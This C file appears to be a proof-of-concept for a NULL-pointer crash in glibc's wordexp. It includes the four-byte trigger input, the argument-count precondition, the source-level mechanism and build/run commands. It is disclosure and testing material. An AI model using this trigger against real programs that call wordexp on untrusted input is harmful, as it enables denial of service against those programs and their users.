/* glibc wordexp NULL-deref PoC — CVE-pending (glibc 2.43-4).
 *
 * Trigger: wordexp("$[$@", &p, WRDE_NOCMD)  -- 4 bytes.
 * Precondition: the CALLING process must have __libc_argc >= 3 (invoked with
 * >=2 arguments). Every real program that is called with args satisfies this.
 * Without the argv precondition wordexp returns WRDE_SYNTAX cleanly.
 *
 * Mechanism (source-verified): parse_dollars case '[' calls parse_arith WITHOUT
 * a wordexp_t; parse_arith's nested parse_dollars sees "$@" with argc>2 and
 * parse_param runs w_addword(pwordexp=NULL, ...) -> NULL deref at
 * wordexp.c:1469 (SEGV READ @0x10 in /usr/lib/.../libc.so.6).
 *
 * Build:   gcc -O1 -g -o poc_wordexp_nullderef poc_wordexp_nullderef.c
 * Run:     ./poc_wordexp_nullderef A B      # argc=3 -> SEGV
 * Control: ./poc_wordexp_nullderef          # argc=1 -> rc=5 (WRDE_SYNTAX)
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <wordexp.h>

int main(int argc, char **argv) {
  wordexp_t p;

  fprintf(stderr, "argc=%d  wordexp(\"$[$@\", WRDE_NOCMD)...\n", argc);

  memset(&p, 0, sizeof p);
  int rc = wordexp("$[$@", &p, WRDE_NOCMD);

  /* If argc<3 (or a patched glibc) we land here instead of crashing. */
  fprintf(stderr, "worst case NOT hit: rc=%d%s\n", rc,
          rc == 0 ? " (==0, wordfree)" : " (WRDE_*, clean)");
  if (rc == 0) wordfree(&p);
  return 0;
}